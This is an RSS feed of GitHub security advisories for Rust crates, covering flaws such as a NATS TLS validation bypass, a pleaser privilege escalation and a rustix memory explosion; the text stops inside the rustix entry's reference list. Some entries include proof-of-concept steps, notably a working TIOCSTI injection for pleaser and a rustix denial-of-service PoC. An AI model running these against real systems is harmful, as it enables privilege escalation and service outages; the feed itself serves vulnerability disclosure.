<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2023-11-08T18:01:25.948Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[nats] NATS TLS certificate common name validation bypass]]></title>
        <id>https://github.com/advisories/GHSA-wvc4-j7g5-4f79</id>
        <link href="https://github.com/advisories/GHSA-wvc4-j7g5-4f79"/>
        <updated>2023-11-08T17:39:22.000Z</updated>
        <content type="html"><![CDATA[<p>The NATS official Rust clients are vulnerable to MitM when using TLS.</p>
<p>A fix for the <code>nats</code> crate hasn't been released yet. Since the <code>nats</code> crate is going to be deprecated anyway, consider switching to <code>async-nats</code> <code>&gt;= 0.29</code> which already fixed this vulnerability.</p>
<p>The common name of the server's TLS certificate is validated against the <code>host</code>name provided by the server's plaintext <code>INFO</code> message during the initial connection setup phase. A MitM proxy can tamper with the <code>host</code> field's value by substituting it with the common name of a valid certificate it controls, fooling the client into accepting it.</p>
<h2 id="reproduction-steps">Reproduction steps</h2>
<ol>
<li>The NATS Rust client tries to establish a new connection</li>
<li>The connection is intercepted by a MitM proxy</li>
<li>The proxy makes a separate connection to the NATS server</li>
<li>The NATS server replies with an <code>INFO</code> message</li>
<li>The proxy reads the <code>INFO</code>, alters the <code>host</code> JSON field and passes the tampered <code>INFO</code> back to the client</li>
<li>The proxy upgrades the client connection to TLS, presenting a certificate issued by a certificate authority present in the client's keychain. In the previous step the <code>host</code> was set to the common name of said certificate</li>
<li><code>rustls</code> accepts the certificate, having verified that the common name matches the attacker-controlled value it was given</li>
<li>The client has been fooled by the MitM proxy into accepting the attacker-controlled certificate</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/nats.rs/pull/881">https://github.com/nats-io/nats.rs/pull/881</a></li>
<li><a href="https://github.com/nats-io/nats.rs/pull/887">https://github.com/nats-io/nats.rs/pull/887</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0029.html">https://rustsec.org/advisories/RUSTSEC-2023-0029.html</a></li>
<li><a href="https://github.com/nats-io/nats.rs/commit/9bacb86a480803ece9d1a45aa443081cf1eb815c">https://github.com/nats-io/nats.rs/commit/9bacb86a480803ece9d1a45aa443081cf1eb815c</a></li>
<li><a href="https://github.com/advisories/GHSA-wvc4-j7g5-4f79">https://github.com/advisories/GHSA-wvc4-j7g5-4f79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvc4-j7g5-4f79</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-27T21:12:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s2n-quic] s2n-quic potential denial of service via crafted stream frames]]></title>
        <id>https://github.com/advisories/GHSA-475v-pq2g-fp9g</id>
        <link href="https://github.com/advisories/GHSA-475v-pq2g-fp9g"/>
        <updated>2023-11-08T15:03:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An issue in s2n-quic could result in unnecessary resource utilization when peers open streams beyond advertised limits.</p>
<p>Impacted versions: &lt;= v1.30.0.</p>
<h3 id="patches">Patches</h3>
<p>The patch is included in v1.31.0 [1].</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround. Applications using s2n-quic should upgrade to the most recent release of s2n-quic.</p>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS Security via our vulnerability reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://github.com/aws/s2n-quic/releases/tag/v1.31.0">https://github.com/aws/s2n-quic/releases/tag/v1.31.0</a>
[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/vulnerability-reporting</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aws/s2n-quic/security/advisories/GHSA-475v-pq2g-fp9g">https://github.com/aws/s2n-quic/security/advisories/GHSA-475v-pq2g-fp9g</a></li>
<li><a href="https://github.com/aws/s2n-quic/commit/73e66b066de4940d129dbf33d91c39170eb4c38d">https://github.com/aws/s2n-quic/commit/73e66b066de4940d129dbf33d91c39170eb4c38d</a></li>
<li><a href="https://github.com/aws/s2n-quic/releases/tag/v1.31.0">https://github.com/aws/s2n-quic/releases/tag/v1.31.0</a></li>
<li><a href="https://github.com/advisories/GHSA-475v-pq2g-fp9g">https://github.com/advisories/GHSA-475v-pq2g-fp9g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-475v-pq2g-fp9g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-11-08T15:03:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rusty-paseto] rusty_paseto vulnerable to private key extraction due to ed25519-dalek dependency]]></title>
        <id>https://github.com/advisories/GHSA-j57r-4qw6-58r3</id>
        <link href="https://github.com/advisories/GHSA-j57r-4qw6-58r3"/>
        <updated>2023-11-07T23:44:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>The vulnerability, known as RUSTSEC-2022-0093, impacts the <code>ed25519-dalek</code> crate, which is a dependency of the <code>rusty-paseto</code> crate. This issue arises from a "Double Public Key Signing Function Oracle Attack" affecting versions of <code>ed25519-dalek</code> prior to v2.0. These versions expose an unsafe API for serializing and deserializing 64-byte keypairs that include both private and public keys, creating potential for certain attacks. <code>d25519-dalek</code> users utilizing these serialization and deserialization functions directly could potentially be impacted. </p>
<h2 id="patches">Patches</h2>
<p>The vulnerability within the <code>ed25519-dalek</code> crate has been addressed in version 2.0. <code>rusty-paseto</code> has addressed it in release v0.6.0. </p>
<h2 id="workarounds">Workarounds</h2>
<p>Users are recommended to upgrade to v0.6.0 of <code>rusty-paseto</code>. However, users should still ensure that their key serialization and deserialization practices are secure and avoid any practices that could lead to key exposure.</p>
<h2 id="references">References</h2>
<p>More information about RUSTSEC-2022-0093 can be found in the <a href="https://rustsec.org/advisories/RUSTSEC-2022-0093.html">RustSec Advisory Database</a>. Updates and details regarding the upcoming release of <code>rusty-paseto</code> will be documented in the project's <a href="https://github.com/your-repo/rusty-paseto/releases">releases</a> and <a href="https://github.com/your-repo/rusty-paseto/blob/main/CHANGELOG.md">changelog</a>.  This issue was first reported by Dependabot on 2023-08-15. The source was reviewed by @rrrodzilla at that time and a determination was made that the vulnerability low harm to existing users due to the strongly typed nature of keys provided by the rusty-paseto API. @techport-om reported the vulnerability to the repository by discovering during a <code>cargo-audit</code> run on 2023-11-05 and opened <a href="https://github.com/rrrodzilla/rusty_paseto/issues/28">issue 28</a>. This advisory was created at that time to notify existing users.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/rrrodzilla/rusty_paseto/security/advisories/GHSA-j57r-4qw6-58r3">https://github.com/rrrodzilla/rusty_paseto/security/advisories/GHSA-j57r-4qw6-58r3</a></li>
<li><a href="https://github.com/rrrodzilla/rusty_paseto/commit/42718c1b757c1dfabb80621f2f48b8268f7fa24e">https://github.com/rrrodzilla/rusty_paseto/commit/42718c1b757c1dfabb80621f2f48b8268f7fa24e</a></li>
<li><a href="https://github.com/rrrodzilla/rusty_paseto/releases/tag/v0.6.0">https://github.com/rrrodzilla/rusty_paseto/releases/tag/v0.6.0</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0093.html">https://rustsec.org/advisories/RUSTSEC-2022-0093.html</a></li>
<li><a href="https://github.com/advisories/GHSA-j57r-4qw6-58r3">https://github.com/advisories/GHSA-j57r-4qw6-58r3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j57r-4qw6-58r3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-11-07T23:44:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[failure] Type confusion if __private_get_type_id__ is overriden]]></title>
        <id>https://github.com/advisories/GHSA-jq66-xh47-j9f3</id>
        <link href="https://github.com/advisories/GHSA-jq66-xh47-j9f3"/>
        <updated>2023-11-02T22:50:48.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the failure crate through 0.1.5 for Rust. It has a type confusion flaw when downcasting. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25575">https://nvd.nist.gov/vuln/detail/CVE-2020-25575</a></li>
<li><a href="https://github.com/rust-lang-nursery/failure/issues/336">https://github.com/rust-lang-nursery/failure/issues/336</a></li>
<li><a href="https://github.com/RustCrypto/hashes/pull/91">https://github.com/RustCrypto/hashes/pull/91</a></li>
<li><a href="https://boats.gitlab.io/blog/post/failure-to-fehler/">https://boats.gitlab.io/blog/post/failure-to-fehler/</a></li>
<li><a href="https://github.com/RustSec/advisory-db/blob/main/crates/failure/RUSTSEC-2019-0036.md">https://github.com/RustSec/advisory-db/blob/main/crates/failure/RUSTSEC-2019-0036.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2019-0036.html">https://rustsec.org/advisories/RUSTSEC-2019-0036.html</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2020-0036.html">https://rustsec.org/advisories/RUSTSEC-2020-0036.html</a></li>
<li><a href="https://github.com/advisories/GHSA-jq66-xh47-j9f3">https://github.com/advisories/GHSA-jq66-xh47-j9f3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jq66-xh47-j9f3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-06-16T23:06:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stellar-strkey] stellar-strkey vulnerable to panic in SignedPayload::from_payload]]></title>
        <id>https://github.com/advisories/GHSA-5873-6fwq-463f</id>
        <link href="https://github.com/advisories/GHSA-5873-6fwq-463f"/>
        <updated>2023-10-31T21:21:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Panic vulnerability when a specially crafted payload is used. 
This is because of the following calculation:</p>
<pre><code class="language-rust">inner_payload_len + (4 - inner_payload_len % 4) % 4
</code></pre>
<p>If <code>inner_payload_len</code> is <code>0xffffffff</code>, <code>(4 - inner_payload_len % 4) % 4 = 1</code> so</p>
<pre><code class="language-rust">inner_payload_len + (4 - inner_payload_len % 4) % 4 = u32::MAX + 1
</code></pre>
<p>which overflow.</p>
<h3 id="patches">Patches</h3>
<p>Check that <code>inner_payload_len</code> is not above 64 which should never be the case.
Patched in version 0.0.8</p>
<h3 id="workarounds">Workarounds</h3>
<p>Sanitize input payload before it is passed to the vulnerable function so that bytes in <code>payload[32..32+4]</code> and parsed as a <code>u32</code> is not above 64.</p>
<h3 id="references">References</h3>
<p>GitHub issue #58</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/stellar/rs-stellar-strkey/security/advisories/GHSA-5873-6fwq-463f">https://github.com/stellar/rs-stellar-strkey/security/advisories/GHSA-5873-6fwq-463f</a></li>
<li><a href="https://github.com/stellar/rs-stellar-strkey/issues/58">https://github.com/stellar/rs-stellar-strkey/issues/58</a></li>
<li><a href="https://github.com/stellar/rs-stellar-strkey/pull/59">https://github.com/stellar/rs-stellar-strkey/pull/59</a></li>
<li><a href="https://github.com/stellar/rs-stellar-strkey/commit/83adad0f5b1cda693c7ba8524d395add8077865f">https://github.com/stellar/rs-stellar-strkey/commit/83adad0f5b1cda693c7ba8524d395add8077865f</a></li>
<li><a href="https://github.com/stellar/rs-stellar-strkey/releases/tag/v0.0.8">https://github.com/stellar/rs-stellar-strkey/releases/tag/v0.0.8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46135">https://nvd.nist.gov/vuln/detail/CVE-2023-46135</a></li>
<li><a href="https://github.com/advisories/GHSA-5873-6fwq-463f">https://github.com/advisories/GHSA-5873-6fwq-463f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5873-6fwq-463f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-25T14:09:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cocoon] Sequential calls of encryption API (`encrypt`, `wrap`, and `dump`) result in nonce reuse]]></title>
        <id>https://github.com/advisories/GHSA-6878-6wc2-pf5h</id>
        <link href="https://github.com/advisories/GHSA-6878-6wc2-pf5h"/>
        <updated>2023-10-24T19:22:26.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Problem</strong>: Trying to create a new encrypted message with the same cocoon object generates the same ciphertext. It mostly affects <code>MiniCocoon</code> and <code>Cocoon</code> objects with custom seeds and RNGs (where <code>StdRng</code> is used under the hood).</p>
<p><strong>Note</strong>: The issue does <strong>NOT</strong> affect objects created with <strong><code>Cocoon::new</code></strong> which utilizes <code>ThreadRng</code>.</p>
<p><strong>Cause</strong>: <code>StdRng</code> produces the same nonce because <code>StdRng::clone</code> resets its state.</p>
<p><strong>Measure</strong>: Make encryption API mutable (<code>encrypt</code>, <code>wrap</code>, and <code>dump</code>).</p>
<p><strong>Workaround</strong>: Create a new cocoon object with a new <strong>seed</strong> per each encryption.</p>
<h2 id="how-to-reproduce">How to Reproduce</h2>
<pre><code class="language-rust">let cocoon = MiniCocoon::from_password(b"password", &amp;[1; 32]);
let mut data1 = "my secret data".to_owned().into_bytes();
let _ = cocoon.encrypt(&amp;mut data1)?;

let mut data2 = "my secret data".to_owned().into_bytes();
let _ = cocoon.encrypt(&amp;mut data2)?;

// data1: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]
// data2: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]
</code></pre>
<h2 id="workaround">Workaround</h2>
<p>For <code>cocoon &lt;= 0.3.3</code>, create a new cocoon with a different <strong>seed</strong> per each <code>encrypt</code>/<code>wrap</code>/<code>dump</code> call.</p>
<pre><code class="language-rust">let cocoon = MiniCocoon::from_password(b"password", &amp;[1; 32]);
let mut data1 = "my secret data".to_owned().into_bytes();
let _ = cocoon.encrypt(&amp;mut data1)?;

// Another seed: &amp;[2; 32].
let cocoon = MiniCocoon::from_password(b"password", &amp;[2; 32]);
let mut data2 = "my secret data".to_owned().into_bytes();
let _ = cocoon.encrypt(&amp;mut data2)?;

// data1: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]
// data2: [53, 223, 209, 96, 130, 99, 209, 108, 83, 189, 123, 81, 19, 1]
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fadeevab/cocoon/issues/22">https://github.com/fadeevab/cocoon/issues/22</a></li>
<li><a href="https://github.com/fadeevab/cocoon/commit/1b6392173ce35db4736a94b62b2d2973f9a71441">https://github.com/fadeevab/cocoon/commit/1b6392173ce35db4736a94b62b2d2973f9a71441</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0068.html">https://rustsec.org/advisories/RUSTSEC-2023-0068.html</a></li>
<li><a href="https://github.com/advisories/GHSA-6878-6wc2-pf5h">https://github.com/advisories/GHSA-6878-6wc2-pf5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6878-6wc2-pf5h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-24T19:22:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pleaser] Pleaser privilege escalation vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cgf8-h3fp-h956</id>
        <link href="https://github.com/advisories/GHSA-cgf8-h3fp-h956"/>
        <updated>2023-10-31T21:41:27.000Z</updated>
        <content type="html"><![CDATA[<p>please (aka pleaser) through 0.5.4 allows privilege escalation through the TIOCSTI and/or TIOCLINUX ioctl. (If both TIOCSTI and TIOCLINUX are disabled, this cannot be exploited.)</p>
<p>Here is how to see it in action:</p>
<pre><code>$ cd "$(mktemp -d)"
$ git clone --depth 1 https://gitlab.com/edneville/please.git
$ cd please/
$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9
$ cargo test &amp;&amp; cargo build --release
$ echo "[${USER}_as_nobody]"$'\nname='"${USER}"$'\ntarget=nobody\nrule=.*\nrequire_pass=false' | sudo tee /etc/please.ini
$ sudo chown root:root ./target/release/please
$ sudo chmod u+s ./target/release/please
$ cat &lt;&lt;TIOCSTI_C_EOF | tee TIOCSTI.c
#include &lt;sys/ioctl.h&gt;

int main(void) {
  const char *text = "id\n";
  while (*text)
    ioctl(0, TIOCSTI, text++);
  return 0;
}
TIOCSTI_C_EOF
$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c
$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody
</code></pre>
<p>Please note that:</p>
<p>This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46277">https://nvd.nist.gov/vuln/detail/CVE-2023-46277</a></li>
<li><a href="https://github.com/rustsec/advisory-db/pull/1798">https://github.com/rustsec/advisory-db/pull/1798</a></li>
<li><a href="https://gitlab.com/edneville/please/-/issues/13">https://gitlab.com/edneville/please/-/issues/13</a></li>
<li><a href="https://gitlab.com/edneville/please/-/merge_requests/69#note_1594254575">https://gitlab.com/edneville/please/-/merge_requests/69#note_1594254575</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0066.html">https://rustsec.org/advisories/RUSTSEC-2023-0066.html</a></li>
<li><a href="https://github.com/advisories/GHSA-cgf8-h3fp-h956">https://github.com/advisories/GHSA-cgf8-h3fp-h956</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cgf8-h3fp-h956</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-20T06:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tauri-cli] Tauri's Updater Private Keys Possibly Leaked via Vite Environment Variables]]></title>
        <id>https://github.com/advisories/GHSA-2rcp-jvr4-r259</id>
        <link href="https://github.com/advisories/GHSA-2rcp-jvr4-r259"/>
        <updated>2023-10-31T21:26:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This advisory is not describing a vulnerability in the Tauri code base itself but a commonly used misconfiguration which could lead to leaking of the private key and updater key password into bundled Tauri applications using the Vite frontend in a specific configuration.</p>
<p>The Tauri documentation used an insecure example configuration in the <a href="https://tauri.app/v1/guides/getting-started/setup/vite/">Vite guide</a> to showcase how to use Tauri together with Vite. </p>
<p>Copying the following snippet <code>envPrefix: ['VITE_', 'TAURI_'],</code> from this guide into the <code>vite.config.ts</code> of a Tauri project possibly leads to bundling the <code>TAURI_PRIVATE_KEY</code> and <code>TAURI_KEY_PASSWORD</code> into the Vite frontend code and therefore leaking this value to the debug built of a Tauri application.</p>
<p>The value is automatically bundled into debug builds but for production builds it is not embedded, as long as it is not directly referenced in the frontend code. Vite statically replaces these values in production builds. This reduces the amount of affected applications to a very small amount of affected applications.</p>
<p>To verify if you are affected you can search for the private key value or the <code>TAURI_PRIVATE_KEY</code> variable inside the release build frontend assets (<code>dist/</code>).</p>
<blockquote>
<p>Example: <code>grep -r "TAURI_PRIVATE_KEY" dist/</code></p>
</blockquote>
<p>Using only the <code>envPrefix: ['VITE_'],</code> or any other framework than Vite means you are not impacted by this advisory.</p>
<h3 id="patches">Patches</h3>
<p>The documentation has been patched but as the root cause is not in Tauri itself the issue is not fixed by updating Tauri.
The <code>vite.config.ts</code> configuration of the project needs to be adapted.</p>
<p>We recommend rotating your updater private key if you are affected by this (requires Tauri CLI &gt;=1.5.5). After updating the envPrefix configuration, generate a new private key with <code>tauri signer generate</code>, saving the new private key and updating the updater's <code>pubkey</code> value on <code>tauri.conf.json</code> with the new public key. To update your existing application, the next application build must be signed with the older private key in order to be accepted by the existing application.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The <code>envPrefix: ['VITE_'],</code>should be used and the desired <code>TAURI</code> variables manually added.
Respective these variables could be added <code>TAURI_PLATFORM</code>, <code>TAURI_ARCH</code>, <code>TAURI_FAMILY</code>, <code>TAURI_PLATFORM_VERSION</code>, <code>TAURI_PLATFORM_TYPE</code> and <code>TAURI_DEBUG</code> without leaking sensitive information.</p>
<p>We urge affected users to implement the workaround as the <code>1.x</code> branch will not receive a general prevention fix as it would break systems.</p>
<h3 id="references">References</h3>
<p>The issue was originally disclosed in our discord <a href="https://discord.com/channels/616186924390023171/1164260301655523409">here</a>.
The affected guide is <a href="https://tauri.app/v1/guides/getting-started/setup/vite/">https://tauri.app/v1/guides/getting-started/setup/vite/</a>.</p>
<blockquote>
<p>Update: We lowered the severity from high to low, as the likelihood of impact was found to only affect a <strong>very limited</strong> amount of applications.</p>
</blockquote>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tauri-apps/tauri/security/advisories/GHSA-2rcp-jvr4-r259">https://github.com/tauri-apps/tauri/security/advisories/GHSA-2rcp-jvr4-r259</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46115">https://nvd.nist.gov/vuln/detail/CVE-2023-46115</a></li>
<li><a href="https://github.com/tauri-apps/tauri/commit/8b166e9bf82e69ddb3200a3a825614980bd8d433">https://github.com/tauri-apps/tauri/commit/8b166e9bf82e69ddb3200a3a825614980bd8d433</a></li>
<li><a href="https://discord.com/channels/616186924390023171/1164260301655523409">https://discord.com/channels/616186924390023171/1164260301655523409</a></li>
<li><a href="https://tauri.app/v1/guides/getting-started/setup/vite/">https://tauri.app/v1/guides/getting-started/setup/vite/</a></li>
<li><a href="https://github.com/advisories/GHSA-2rcp-jvr4-r259">https://github.com/advisories/GHSA-2rcp-jvr4-r259</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2rcp-jvr4-r259</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-20T15:18:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apollo-router] Apollo Router vulnerable to Improper Check or Handling of Exceptional Conditions]]></title>
        <id>https://github.com/advisories/GHSA-r344-xw3p-2frj</id>
        <link href="https://github.com/advisories/GHSA-r344-xw3p-2frj"/>
        <updated>2023-11-06T05:01:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Apollo Router is a configurable, high-performance graph router written in Rust to run a federated supergraph that uses Apollo Federation. Affected versions are subject to a Denial-of-Service (DoS) type vulnerability which causes the Router to panic and terminate when a multi-part response is sent. When users send queries to the router that uses the <code>@defer</code> or Subscriptions, the Router will panic.</p>
<p>To be vulnerable, users of Router must have a coprocessor with <code>coprocessor.supergraph.response</code> configured in their <code>router.yaml</code> and also to support either <code>@defer</code> or Subscriptions.  </p>
<h3 id="patches">Patches</h3>
<p>Router version 1.33.0 has a fix for this vulnerability. <a href="https://github.com/apollographql/router/pull/4014">https://github.com/apollographql/router/pull/4014</a> fixes the issue.  </p>
<h3 id="workarounds">Workarounds</h3>
<p>For affected versions, avoid using the coprocessor supergraph response:</p>
<pre><code class="language-yml"># do not use this stage in your coprocessor configuration
coprocessor:
  supergraph:
    response:
</code></pre>
<p>Or you can disable defer and subscriptions support:</p>
<pre><code class="language-yml"># disable defer and subscriptions:
supergraph:
  defer_support: false # enabled by default
subscription:
  enabled: false # disabled by default
</code></pre>
<p>and continue to use the coprocessor supergraph response.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/apollographql/router/issues/4013">https://github.com/apollographql/router/issues/4013</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-r344-xw3p-2frj">https://github.com/apollographql/router/security/advisories/GHSA-r344-xw3p-2frj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-45812">https://nvd.nist.gov/vuln/detail/CVE-2023-45812</a></li>
<li><a href="https://github.com/apollographql/router/issues/4013">https://github.com/apollographql/router/issues/4013</a></li>
<li><a href="https://github.com/apollographql/router/pull/4014">https://github.com/apollographql/router/pull/4014</a></li>
<li><a href="https://github.com/apollographql/router/commit/b917b8c117b46a2d508428c0856f4927dfcfc341">https://github.com/apollographql/router/commit/b917b8c117b46a2d508428c0856f4927dfcfc341</a></li>
<li><a href="https://github.com/advisories/GHSA-r344-xw3p-2frj">https://github.com/advisories/GHSA-r344-xw3p-2frj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r344-xw3p-2frj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-19T16:08:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion]]></title>
        <id>https://github.com/advisories/GHSA-c827-hfw6-qwvm</id>
        <link href="https://github.com/advisories/GHSA-c827-hfw6-qwvm"/>
        <updated>2023-10-18T18:27:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to "get stuck" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>
<h3 id="details">Details</h3>
<h4 id="discovery">Discovery</h4>
<p>The symptoms were initially discovered in <a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">this post</a> and the <a href="https://discord.com/channels/273534239310479360/1161137828395237556">Discord thread</a> for details.</p>
<h4 id="diagnosis">Diagnosis</h4>
<p>This issue is caused by the combination of two independent bugs:</p>
<ol>
<li>Stuck iterator</li>
</ol>
<ul>
<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>
</ul>
<ol start="2">
<li>Memory over-allocation</li>
</ol>
<ul>
<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>
</ul>
<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-rust">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    // create a directory, get a FD to it, then unlink the directory but keep the FD
    std::fs::create_dir("tmp_dir")?;
    let dir_fd = rustix::fs::openat(
        rustix::fs::CWD,
        rustix::cstr!("tmp_dir"),
        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,
        rustix::fs::Mode::empty(),
    )?;
    std::fs::remove_dir("tmp_dir")?;

    // iterator gets stuck in infinite loop and memory explodes
    rustix::fs::Dir::read_from(dir_fd)?
        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`
        // therefore if the implementation ignores the error (or otherwise continues
        // after seeing the error instead of breaking), the loop will not halt
        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())
        .for_each(|dirent| {
            // your happy path
            println!("{dirent:?}");
        });

    Ok(())
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>
<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>
<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>
